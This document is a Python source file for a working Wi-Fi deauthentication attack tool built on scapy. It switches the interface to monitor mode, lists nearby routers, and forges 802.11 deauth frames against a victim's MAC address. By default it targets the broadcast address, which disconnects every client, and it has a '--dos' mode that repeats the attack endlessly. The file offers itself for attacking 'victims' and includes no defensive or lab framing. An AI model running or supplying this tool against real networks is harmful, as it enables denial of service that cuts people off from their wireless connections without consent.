import signal
import argparse
import subprocess
from scapy.all import sendp, os
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon
from scapy.sendrecv import sniff


bbssid = []


def getAllWifiDevices(packet):
    if packet.haslayer(Dot11):
        if packet.addr2 and packet.addr2 not in bbssid:
            try:
                stats = packet[Dot11Beacon].network_stats()
                bbssid.append(packet.addr2)
                print(len(bbssid), packet.addr2, packet.dBm_AntSignal, stats.get("channel"),
                      *stats.get("crypto"), packet.info.decode("utf-8"))
            except:
                pass


def getMacBbsid(interface):
    subprocess.run("iwconfig %s" % interface, shell=True, check=True)


def setMonitorMode(interface):
    os.system('nmcli dev disconnect %s' % interface)
    os.system('ifconfig %s down' % interface)
    os.system('iwconfig %s mode monitor' % interface)
    os.system('ifconfig %s up' % interface)


def setManagedMode(interface):
    os.system('ifconfig %s down' % interface)
    os.system('iwconfig %s mode managed' % interface)
    os.system('ifconfig %s up' % interface)


# Sending deauth message
# Prerequisites:
# attacker and victim have wifi.
# attacker have the network interface in monitor mode
def deauth(macVictim, interface, gateway):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=macVictim, addr2=gateway, addr3=gateway) / Dot11Deauth(reason=2)
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)


def ex():
    print("You can only choose one: -a -g -mt -mg")
    exit(1)


def checkParameters(args):
    if args.getMacBbsid:
        if args.getAllBbsid:
            ex()
        elif args.monitorMode:
            ex()
        elif args.managedMode:
            ex()
        else:
            try:
                print(getMacBbsid())
            except:
                print("You need to be connected to a network!")
    elif args.getAllBbsid:
        if args.monitorMode:
            ex()
        elif args.managedMode:
            ex()
        else:
            sniff(iface=args.interface, prn=getAllWifiDevices)
    elif args.monitorMode:
        if args.managedMode:
            ex()
        else:
            setMonitorMode(args.interface)
    elif args.managedMode:
        setManagedMode(args.interface)
    else:
        if args.victim is None:
            macVictim = "ff:ff:ff:ff:ff:ff"
        else:
            macVictim = args.victim

        if args.bssid is None:
            print("You have to set de the router bbsid")
        else:
            if args.dos:
                print("Press enter to kill the program")
                newpid = os.fork()
                if newpid == 0:
                    while True:
                        deauth(macVictim, args.interface, args.bssid)
                else:
                    input('')
                    os.kill(newpid, signal.SIGKILL)
            else:
                deauth(macVictim, args.interface, args.bssid)


if __name__ == "__main__":
    macVictim = ""
    parser = argparse.ArgumentParser(
        description="This script deauthenticates a device from a router. It can be used to with all devices (ff:ff:ff:ff:ff:ff).\n"
                    "Prerequisites: You and your victim need to have wifi. ")
    ######################################################################################################################
    parser.add_argument("-v", "--victim", required=False,
                        help="Victim MAC address. Default ff:ff:ff:ff:ff:ff (send to broadcast, it will affect all devices connected by wifi)")  # default ff:ff:ff:ff:ff:ff
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-b", "--bssid", required=False, help="Gateway MAC address")
    parser.add_argument("-d", "--dos", required=False, action="store_true", help="This option put de deauthentication function in an endless loop")
    #####################################################################################################
    parser.add_argument("-g", "--getMacBbsid", required=False, action='store_true',
                        help="This options get the MAC of the router you are connected to and more information about it")
    parser.add_argument("-a", "--getAllBbsid", required=False, action='store_true',
                        help="This options get all mac of the nearby routers")
    parser.add_argument("-mt", "--monitorMode", required=False, action='store_true',
                        help="This option put your interface in monitor mode")
    parser.add_argument("-mg", "--managedMode", required=False, action='store_true',
                        help="This option put your interface in managed mode")
    args = parser.parse_args()

    checkParameters(args)
